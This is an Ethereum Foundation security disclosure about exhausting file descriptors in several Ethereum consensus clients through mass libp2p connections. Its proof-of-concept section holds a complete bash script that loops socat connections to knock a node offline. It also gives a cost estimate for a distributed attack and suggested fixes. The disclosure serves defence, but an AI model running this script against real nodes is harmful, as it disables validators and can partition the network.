# [M] CL-2022-06: Exhausting File Descriptors

## Summary
Severity: Medium
Chain: Ethereum (consensus layer)
Component: Nimbus, Lodestar, Lighthouse, Prysm, Besu
Published: 2023-05-03
Source: https://notes.ethereum.org/VNxP3BsuSqSDKnb8PsGr2A?view=
Type: ef-disclosure

## Details
# File Descriptor Attack

### Bug Hunter
Jonny Rhea

### Summary
An attacker can cause a node to hold on to an arbitrarily large number of file descriptors and effectively disabling it. This allows an attacker to for example target block proposers or create a coordinated network partition attack.


### POC
1. Launch the client
2. Check max file descriptors allowed
    ```bash
    $ cat /proc/`(ps aux | grep -v grep |grep -i CLIENTNAME | awk '{print $2;}')`/limits |grep 'open files'
    Limit                     Soft Limit           Hard Limit           Unit
    Max open files            1024              1024              files
    ```
3. Check how many file descriptors are open:
    ```bash
    $ ls -U /proc/`(ps aux | grep -v grep |grep -i CLIENTNAME | awk '{print $2;}')`/fd | wc -l
    ```
4. Launch attack script.
    ```bash
    $ ./attack.sh 192.168.1.16 9000 .01
    ```
The following script is capable of opening thousands of connections to a node at the libp2p layer and leaving them to time out naturally:

```bash
    #!/bin/bash

    # Usage: 
    # 
    # ./attack.sh IP PORT SLEEP
    # ./attack.sh 192.168.0.123 9000 .01

    set -e
    trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

    IP=$1
    PORT=$2
    SLEEP=$3
    count=0
    while [ 1 ]
    do
        socat -t 100 stdio tcp:$IP:$PORT,shut-none &
        printf "count=%d\n" "$count"
        (( count++ ))
        sleep $SLEEP #.005
    done
```

5. Clients will now behave differently. If the soft limit is set low and there is no IP limit, the client may crash very quickly as file descriptors are filled up. If a client has got an IP limit in place but a low soft limit, multiple hosts would need to take part of the attack to disable the host. Once the file descriptors are filled up, for some clients the client may also not recover even though the attack stops.


### Suggested Fixes
1. If there is no IP limit in place: modify the libp2p ConnectionManager code to limit the number of concurrent connections that can be processed (per IP) to a reasonable number so there is a natural back pressure built-in. libp2p implementations such as nim & rust seem to limit this to ~4.
2. If the soft limit is not set high enough, Fix #1 may not provide enough protection. An attacker could still setup a large amount of cloud instances to easily bypass the limit of 4 connections per IP. For example, on Ubuntu the default soft limit would be set to 1024 unless overridden. To perform the attack you would require 256 hosts, which would cost $5 per hour on AWS. These 256 hosts can then be used to attack multiple nodes at the same time. To fix this, the clients which has not yet done so should add code that bumps the file descriptor soft limit to the hard limit. Depending on system configuration, this would make it difficult to secure enough IP addresses to hit the file descriptor hard limit. 

It could also help if there was a suggested recommendation for system configuration w/ respect to file descriptor limits when operating a node.
